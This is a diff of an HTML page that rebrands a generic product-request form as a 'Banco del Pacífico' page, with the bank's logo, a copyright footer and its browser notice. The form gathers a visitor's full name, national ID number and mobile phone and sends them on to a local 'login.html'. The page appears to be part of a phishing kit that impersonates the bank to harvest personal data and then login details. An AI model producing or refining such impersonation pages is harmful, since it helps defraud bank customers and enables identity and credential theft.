@@ -3,44 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solicitud de Productos</title>
+    <title>Banco del Pacífico - Solicitud</title>
     <style>
-        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 0; }
-        body { background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .container { background: #ffffff; padding: 35px 25px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 400px; text-align: center; }
-        .logo { max-width: 140px; margin-bottom: 25px; height: auto; }
-        h2 { color: #1e293b; margin-bottom: 8px; font-size: 1.5rem; font-weight: 700; }
-        .subtitle { color: #64748b; font-size: 0.9rem; margin-bottom: 25px; line-height: 1.4; }
-        .form-group { margin-bottom: 20px; text-align: left; }
-        label { display: block; font-size: 0.85rem; font-weight: 600; color: #475569; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
-        input { width: 100%; padding: 14px; border: 1px solid #cbd5e1; border-radius: 10px; font-size: 0.95rem; color: #1e293b; outline: none; transition: all 0.3s ease; background-color: #f8fafc; }
-        input:focus { border-color: #0056b3; background-color: #ffffff; box-shadow: 0 0 0 4px rgba(0, 86, 179, 0.1); }
-        .btn-submit { width: 100%; padding: 15px; background: #0056b3; color: white; border: none; border-radius: 10px; font-size: 1rem; font-weight: 700; cursor: pointer; margin-top: 10px; transition: background 0.3s ease; box-shadow: 0 4px 12px rgba(0, 86, 179, 0.2); }
-        .btn-submit:hover { background: #004085; }
+        * { box-sizing: border-box; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #eef2f6; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .logo-top { max-width: 180px; margin-bottom: 20px; }
+        .card { background: #ffffff; padding: 40px 30px 30px 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.03); width: 100%; max-width: 420px; text-align: center; }
+        h2 { color: #1a1a1a; font-size: 1.8rem; font-weight: 700; margin-bottom: 30px; }
+        
+        .form-group { margin-bottom: 25px; text-align: left; position: relative; }
+        .floating-label { color: #0056b3; font-size: 0.85rem; font-weight: 500; display: block; margin-bottom: 4px; }
+        input { width: 100%; border: none; border-bottom: 2px solid #0056b3; padding: 8px 0; font-size: 1rem; color: #333; outline: none; background: transparent; transition: border-color 0.3s ease; }
+        input::placeholder { color: #b0b8c1; font-size: 0.95rem; }
+        
+        .btn-primary { width: 100%; padding: 14px; background: #0056b3; color: #ffffff; border: none; border-radius: 6px; font-size: 1rem; font-weight: 500; cursor: pointer; margin-top: 15px; box-shadow: 0 2px 5px rgba(0, 86, 179, 0.2); transition: background 0.2s ease; }
+        .btn-primary:hover { background: #004494; }
+        
+        .footer-text { margin-top: 25px; font-size: 0.72rem; color: #7a869a; line-height: 1.6; text-align: center; max-width: 400px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="./logo.png" alt="Logotipo" class="logo">
-    <h2>Iniciar Solicitud</h2>
-    <p class="subtitle">Complete los campos informativos para iniciar el proceso de validación comercial.</p>
+<img src="./logo.png" alt="Banco del Pacífico" class="logo-top">
+
+<div class="card">
+    <h2>Solicitud</h2>
     
     <form action="login.html" method="GET">
         <div class="form-group">
-            <label>Nombre Completo</label>
-            <input type="text" required placeholder="Ej. Juan Pérez">
+            <span class="floating-label">Nombre Completo</span>
+            <input type="text" required placeholder="Ingrese su nombre">
         </div>
         <div class="form-group">
-            <label>Cédula de Identidad</label>
-            <input type="text" required placeholder="Número de identificación">
+            <span class="floating-label">Cédula de Identidad</span>
+            <input type="text" required placeholder="Ingrese su identificación">
         </div>
         <div class="form-group">
-            <label>Número de Teléfono</label>
-            <input type="tel" required placeholder="Ej. +504 9999-9999">
+            <span class="floating-label">Número de Celular</span>
+            <input type="tel" required placeholder="Ingrese su teléfono">
         </div>
-        <button type="submit" class="btn-submit">Continuar</button>
+        <button type="submit" class="btn-primary">Continuar</button>
     </form>
+</div>
+
+<div class="footer-text">
+    Recomendamos utilizar la Banca Virtual con los navegadores<br>Chrome 36.0.1, Firefox 31.0, Microsoft Edge.<br><br>
+    © Copyright 2017 Banco del Pacífico *V5.4.0
 </div>
 
 </body>
